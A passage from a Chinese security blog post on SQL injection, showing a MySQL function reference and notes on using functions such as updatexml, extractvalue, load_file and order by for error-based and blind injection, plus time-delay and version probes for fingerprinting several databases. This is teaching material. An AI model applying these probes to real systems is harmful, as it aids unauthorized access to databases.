<td>concat( )</td>
<td>没有分隔符的连接字符串</td>
</tr>
<tr>
<td>concat_ws ( )</td>
<td>含有分割符的连接字符串</td>
</tr>
<tr>
<td>group_conat( )</td>
<td>连接一个组的字符串</td>
</tr>
<tr>
<td>ord( )</td>
<td>返回ASCII码</td>
</tr>
<tr>
<td>ascii( )</td>
<td>返回ASCII码</td>
</tr>
<tr>
<td>hex( )</td>
<td>将字符串转换为十六进制</td>
</tr>
<tr>
<td>unhex( )</td>
<td>hex的反向操作</td>
</tr>
<tr>
<td>md5( )</td>
<td>返回MD5值</td>
</tr>
<tr>
<td>floor(x)</td>
<td>返回不大于x的最大整数</td>
</tr>
<tr>
<td>round ( )</td>
<td>返回参数x接近的整数</td>
</tr>
<tr>
<td>rand( )</td>
<td>返回0-1之间的随机浮点数</td>
</tr>
<tr>
<td>load_file( )</td>
<td>读取文件，并返回文件内容作为一个字符串</td>
</tr>
<tr>
<td>find_in_set( )</td>
<td>返回字符串在字符串列表中的位置</td>
</tr>
<tr>
<td>benchmark( )</td>
<td>指定语句执行的次数</td>
</tr>
<tr>
<td>name_const ( )</td>
<td>返回表作为结果</td>
</tr>
<tr>
<td>user( )</td>
<td>用户名</td>
</tr>
<tr>
<td>current_user( )</td>
<td>当前用户名</td>
</tr>
<tr>
<td>system_ user( )</td>
<td>系统用户名</td>
</tr>
<tr>
<td>@@datadir</td>
<td>数据库路径</td>
</tr>
<tr>
<td>@@versoin_compile_os</td>
<td>操作系统版本</td>
</tr>
</tbody>
</table>
<pre><code class="hljs plaintext">user()                  //返回当前使用数据库的用户
version()             //返回当前数据库的版本
database()          //返回当前使用的数据库
group_concat()  //多行数据拼接至一行显示+group_by根据分组排序
concat_ws()        //把不同列的数据以特定字符隔开
#  --  --+            //在MYSQL中的注释符   （注意:有时候注释符需要多试几种，有的时候--+不行，但是#可以）
order by             //排序函数  判断列   原理：order by 后面跟哪个列名就是通过跟哪个列进行排序，如果后面跟的是数字，那么1就代表根据第一列排序，2代表第二列，3代表第三列，那么一直输入数字的大小就可以判断数据表有多少列了
count()             //计数函数  报错时候可以用到，或者布尔注入和延时注入时查询有多少个表，多少个列的时候可以用到
rand()              //产生一个随机数返回的随机数是大于等于 0 及小于 1 的均匀分布随机实数     报错注入时候有用

updatexml(XML_document, XPath_string, new_value); 
第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 
第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 
第三个参数：new_value，String格式，替换查找到的符合条件的数据 
作用：改变文档中符合条件的节点的值

extractvalue() :对XML文档进行查询的函数
其实就是相当于我们熟悉的HTML文件中用 &lt;div&gt;&lt;p&gt;&lt;a&gt;标签查找元素一样
语法：extractvalue(目标xml文档，xml路径)
第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</code></pre>
<p>INFORMATION_SCHEMA数据库</p>
<p>mysql5.0以下没有该表</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230605211314796.png" alt="image-20230605211314796"></p>
<h2 id="0x07-数据库检测">0x07 数据库检测</h2>
<h3 id="71-mysql">7.1 MySQL</h3>
<ul>
<li>
<p>sleep <code>sleep(1)</code></p>
</li>
<li>
<p>benchmark <code>BENCHMARK(5000000, MD5('test'))</code></p>
</li>
<li>
<ul>
<li>
<p>字符串连接</p>
<p><code>SELECT 'a' 'b'``SELECT CONCAT('some','string')</code></p>
</li>
</ul>
</li>
<li>
<ul>
<li>
<p>version</p>
<p><code>SELECT @@version``SELECT version()</code></p>
</li>
</ul>
</li>
<li>
<ul>
<li>
<p>识别用函数</p>
<p><code>connection_id()``last_insert_id()``row_count()</code></p>
</li>
</ul>
</li>
</ul>
<h3 id="72-oracle">7.2 Oracle</h3>
<ul>
<li>
<ul>
<li>
<p>字符串连接</p>
<p><code>'a'||'oracle' --``SELECT CONCAT('some','string')</code></p>
</li>
</ul>
</li>
<li>
<ul>
<li>
<p>version</p>
<p><code>SELECT banner FROM v$version``SELECT banner FROM v$version WHERE rownum=1</code></p>
</li>
</ul>
</li>
</ul>
<h3 id="73-sqlserver">7.3 SQLServer</h3>
<ul>
<li>
<p>WAITFOR <code>WAITFOR DELAY '00:00:10';</code></p>
</li>
<li>
<p>SERVERNAME <code>SELECT @@SERVERNAME</code></p>
</li>
<li>
<p>version <code>SELECT @@version</code></p>
</li>
<li>
<ul>
<li>
<p>字符串连接</p>
<p><code>SELECT 'some'+'string'</code></p>
</li>
</ul>
</li>
<li>
<ul>
<li>
<p>常量</p>
<p><code>@@pack_received``@@rowcount</code></p>
</li>
</ul>
</li>
</ul>
<h3 id="74-postgresql">7.4 PostgreSQL</h3>
<ul>
<li>sleep <code>pg_sleep(1)</code></li>
</ul>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2023/08/06/qian-xi-sql-zhu-ru/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2023/08/06/qian-xi-sql-zhu-ru/')">浅析sql注入</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2023/08/06/qian-xi-sql-zhu-ru/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=浅析sql注入&amp;url=http://hybcx.xyz/2023/08/06/qian-xi-sql-zhu-ru/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/08/06/qian-xi-csrf-lou-dong/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">浅析CSRF漏洞</div></div></a></div><div class="next-post pull-right"><a href="/2023/08/06/qian-xi-xpath-zhu-ru/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">浅析Xpath注入</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93"><span class="toc-number">1.</span> <span class="toc-text">SQL注入总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BB%80%E4%B9%88%E6%98%AFsqli"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 什么是SQLI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-sql%E6%B3%A8%E5%85%A5%E7%9A%84%E4%BA%A7%E7%94%9F"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 sql注入的产生</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8-web%E7%A8%8B%E5%BA%8F%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.1.</span> <span class="toc-text">注: web程序结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#21-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.1 字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.3.</span> <span class="toc-text">2.2 数字型注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%8C%89%E7%85%A7%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95%E5%88%86"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 按照请求方法分</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#31-get%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text">3.1 GET型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#32-post%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text">3.2 POST型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#33-url%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.3 url注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#34-%E8%AF%B7%E6%B1%82%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.4.</span> <span class="toc-text">3.4 请求头注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%8C%89%E7%85%A7%E6%9C%89%E6%97%A0%E5%9B%9E%E6%98%BE%E5%88%86"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 按照有无回显分</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#41-%E6%B3%A8%E5%85%A5%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.4.1.</span> <span class="toc-text">4.1 注入步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#42-%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="toc-number">1.4.2.</span> <span class="toc-text">4.2 有回显</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#421-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">4.2.1 联合查询注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#422-%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">4.2.2 盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.4.2.2.1.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.4.2.2.2.</span> <span class="toc-text">时间盲注</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#423-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">4.2.3 报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#updatexml%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.2.3.1.</span> <span class="toc-text">updatexml注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#extractvalue%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.2.3.2.</span> <span class="toc-text">extractvalue注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%BB%E9%94%AE%E9%87%8D%E5%A4%8D%E6%8A%A5%E9%94%99"><span class="toc-number">1.4.2.3.3.</span> <span class="toc-text">主键重复报错</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%87%A0%E4%BD%95%E5%87%BD%E6%95%B0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.2.3.4.</span> <span class="toc-text">几何函数注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%BA%A2%E5%87%BA%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.2.3.5.</span> <span class="toc-text">基于溢出的注入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#424-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E4%BA%8C%E9%98%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.2.4.</span> <span class="toc-text">4.2.4 二次注入(二阶注入)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#425-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.2.5.</span> <span class="toc-text">4.2.5 堆叠注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#426-%E5%B0%8Ftip-mysql%E9%95%BF%E5%AD%97%E7%AC%A6%E6%88%AA%E6%96%AD"><span class="toc-number">1.4.2.6.</span> <span class="toc-text">4.2.6 小tip: mysql长字符截断</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#43%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">1.4.3.</span> <span class="toc-text">4.3无回显</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#431-dns-log"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">4.3.1 DNS Log</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#dnslog-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.4.3.1.1.</span> <span class="toc-text">DNSlog 介绍</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#dnslog%E5%9B%9E%E6%98%BE%E5%8E%9F%E7%90%86"><span class="toc-number">1.4.3.1.2.</span> <span class="toc-text">DNSlog回显原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#dnslog-%E5%BA%94%E7%94%A8"><span class="toc-number">1.4.3.1.3.</span> <span class="toc-text">DNSlog 应用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#dnslog%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.4.3.1.4.</span> <span class="toc-text">DNSlog回显注入条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#dnslog-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.3.1.5.</span> <span class="toc-text">DNSlog-sql注入</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-sqli%E9%98%B2%E5%BE%A1%E5%8F%8A%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 SQLI防御及绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#51-%E5%B5%8C%E5%A5%97%E5%8F%8A%E5%A4%A7%E5%B0%8F%E5%86%99%E6%B7%B7%E6%B7%86%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.1.</span> <span class="toc-text">5.1 嵌套及大小写混淆绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#52-%E7%A9%BA%E6%A0%BC%E8%A2%AB%E8%BF%87%E6%BB%A4%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.2.</span> <span class="toc-text">5.2 空格被过滤的绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#53-%E9%80%97%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.3.</span> <span class="toc-text">5.3 逗号被过滤的绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#54-%E7%A9%BA%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87%E4%B9%9F%E5%B0%B1%E6%98%AF00%E6%88%AA%E6%96%AD"><span class="toc-number">1.5.4.</span> <span class="toc-text">5.4 空字节绕过（也就是%00截断）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#55-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.5.</span> <span class="toc-text">5.5 编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#56-%E5%BC%95%E5%8F%B7%E8%A2%AB%E8%BD%AC%E4%B9%89"><span class="toc-number">1.5.6.</span> <span class="toc-text">5.6 引号被转义</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="toc-number">1.5.6.0.1.</span> <span class="toc-text">背景知识:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#57-http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="toc-number">1.5.7.</span> <span class="toc-text">5.7 HTTP参数污染</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#58-%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.8.</span> <span class="toc-text">5.8 预编译绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#581-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.5.8.1.</span> <span class="toc-text">5.8.1 简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#582-%E6%A8%A1%E6%8B%9F%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-number">1.5.8.2.</span> <span class="toc-text">5.8.2 模拟预编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#583-%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.8.3.</span> <span class="toc-text">5.8.3 绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#5831-%E9%A2%84%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8%E9%94%99%E8%AF%AF"><span class="toc-number">1.5.8.3.1.</span> <span class="toc-text">5.8.3.1 预编译使用错误</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5832-%E9%83%A8%E5%88%86%E5%8F%82%E6%95%B0%E4%B8%8D%E5%8F%AF%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-number">1.5.8.3.2.</span> <span class="toc-text">5.8.3.2 部分参数不可预编译</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5833-%E9%A2%84%E7%BC%96%E8%AF%91%E5%AE%9E%E7%8E%B0%E9%94%99%E8%AF%AF"><span class="toc-number">1.5.8.3.3.</span> <span class="toc-text">5.8.3.3 预编译实现错误</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#59-%E7%BB%95%E8%BF%87or%E5%92%8Cand%E7%9A%84"><span class="toc-number">1.5.9.</span> <span class="toc-text">5.9 绕过or和and的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#510-%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E5%92%8C%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-number">1.5.10.</span> <span class="toc-text">5.10 绕过空格和注释符</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-mysql%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0"><span class="toc-number">1.6.</span> <span class="toc-text">0x06 Mysql常见函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A3%80%E6%B5%8B"><span class="toc-number">1.7.</span> <span class="toc-text">0x07 数据库检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#71-mysql"><span class="toc-number">1.7.1.</span> <span class="toc-text">7.1 MySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#72-oracle"><span class="toc-number">1.7.2.</span> <span class="toc-text">7.2 Oracle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#73-sqlserver"><span class="toc-number">1.7.3.</span> <span class="toc-text">7.3 SQLServer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#74-postgresql"><span class="toc-number">1.7.4.</span> <span class="toc-text">7.4 PostgreSQL</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon 